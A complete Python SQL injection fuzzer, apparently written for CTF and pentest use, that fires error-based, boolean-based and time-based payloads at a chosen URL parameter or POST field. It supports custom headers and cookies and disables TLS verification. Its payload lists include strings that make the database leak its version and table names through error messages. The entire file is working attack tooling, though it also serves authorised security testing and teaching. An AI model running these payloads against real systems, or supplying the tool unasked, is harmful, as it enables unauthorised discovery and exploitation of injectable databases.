#!/usr/bin/env python3
"""
SQL injection payload fuzzer.
Detects error-based, boolean-based, and time-based SQLi in URL parameters and POST fields.
Requires: requests
"""

import argparse
import sys
import time
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests", file=sys.stderr)
    sys.exit(1)

# ── Payload library ───────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "'--",
    "'-- -",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR 1=1--",   "' OR 1=2--"),
    ("1 AND 1=1",    "1 AND 1=2"),
]

TIME_PAYLOADS = [
    ("' AND SLEEP(3)--",                            "mysql",    3),
    ("'; WAITFOR DELAY '0:0:3'--",                  "mssql",    3),
    ("' AND 1=1 AND SLEEP(3)--",                    "mysql",    3),
    ("1; SELECT pg_sleep(3)--",                     "postgres", 3),
    ("' OR SLEEP(3)--",                             "mysql",    3),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "mysql",    3),
]

DB_ERRORS = {
    "mysql":    ["you have an error in your sql syntax", "warning: mysql",
                 "unclosed quotation mark", "mysql_fetch"],
    "postgres": ["pg_query()", "supplied argument is not a valid postgresql",
                 "unterminated quoted string"],
    "mssql":    ["microsoft ole db provider", "odbc sql server driver",
                 "unclosed quotation mark after the character string"],
    "oracle":   ["ora-", "oracle error", "oracle driver"],
    "sqlite":   ["sqlite3.operationalerror", "sqlite_error"],
    "generic":  ["sql syntax", "syntax error", "unexpected end", "division by zero",
                 "quoted string not properly terminated"],
}


def detect_error(body: str) -> str | None:
    body_lower = body.lower()
    for db, patterns in DB_ERRORS.items():
        for p in patterns:
            if p in body_lower:
                return db
    return None


def make_session(headers: list[str], cookies: str | None) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (CTF-SQLi)"
    for h in headers:
        k, _, v = h.partition(":")
        s.headers[k.strip()] = v.strip()
    if cookies:
        for part in cookies.split(";"):
            k, _, v = part.strip().partition("=")
            s.cookies.set(k.strip(), v.strip())
    return s


def fuzz_param(session, url, method, data, param, timeout, verbose):
    findings = []
    base_resp = send(session, url, method, data, {param: ""}, timeout)
    base_body = base_resp.text if base_resp else ""
    base_len  = len(base_body)

    print(f"\n[*] Fuzzing param: {param!r}")

    # Error-based
    for payload in ERROR_PAYLOADS:
        r = send(session, url, method, data, {param: payload}, timeout)
        if not r:
            continue
        db = detect_error(r.text)
        if db:
            findings.append(f"[ERROR-BASED/{db.upper()}] payload={payload!r}")
            print(f"  [+] Error-based ({db}): {payload!r}")
            if not verbose:
                break

    # Boolean-based
    for true_pl, false_pl in BOOLEAN_PAIRS:
        r_true  = send(session, url, method, data, {param: true_pl},  timeout)
        r_false = send(session, url, method, data, {param: false_pl}, timeout)
        if r_true and r_false:
            len_diff = abs(len(r_true.text) - len(r_false.text))
            if len_diff > 20 and r_true.status_code == r_false.status_code:
                findings.append(f"[BOOLEAN-BASED] true={true_pl!r} false={false_pl!r} diff={len_diff}")
                print(f"  [+] Boolean-based: len diff={len_diff}  true={true_pl!r}")
                if not verbose:
                    break

    # Time-based
    for payload, db, delay in TIME_PAYLOADS:
        start = time.time()
        r = send(session, url, method, data, {param: payload}, timeout + delay + 2)
        elapsed = time.time() - start
        if elapsed >= delay * 0.9:
            findings.append(f"[TIME-BASED/{db.upper()}] payload={payload!r} delay={elapsed:.1f}s")
            print(f"  [+] Time-based ({db}): {payload!r}  elapsed={elapsed:.1f}s")
            if not verbose:
                break

    return findings


def send(session, url, method, base_data, override, timeout):
    try:
        params = {**base_data, **override}
        if method.upper() == "GET":
            return session.get(url, params=params, timeout=timeout, verify=False,
                               allow_redirects=True)
        else:
            return session.post(url, data=params, timeout=timeout, verify=False,
                                allow_redirects=True)
    except Exception:
        return None


def parse_data(data_str: str) -> dict:
    if not data_str:
        return {}
    result = {}
    for part in data_str.split("&"):
        k, _, v = part.partition("=")
        result[k] = v
    return result


def main():
    parser = argparse.ArgumentParser(description="SQL injection payload fuzzer")
    parser.add_argument("--url",     required=True, help="Target URL")
    parser.add_argument("--param",   required=True, help="Parameter name to fuzz")
    parser.add_argument("--method",  default="GET", choices=["GET", "POST"],
                        help="HTTP method (default: GET)")
    parser.add_argument("--data",    default="",
                        help="POST data as key=value&key2=value2")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("--headers", action="append", default=[], metavar="H:V")
    parser.add_argument("--cookies", help="Cookies as key=val;key2=val2")
    parser.add_argument("--verbose", action="store_true",
                        help="Try all payloads even after first hit")
    args = parser.parse_args()

    session  = make_session(args.headers, args.cookies)
    base_data = parse_data(args.data)

    print(f"[*] Target: {args.url}")
    print(f"[*] Method: {args.method}  Param: {args.param}")

    findings = fuzz_param(session, args.url, args.method, base_data,
                          args.param, args.timeout, args.verbose)

    print(f"\n[*] Summary: {len(findings)} finding(s)")
    for f in findings:
        print(f"  {f}")

    if not findings:
        print("  [-] No injection detected with built-in payloads")


if __name__ == "__main__":
    main()
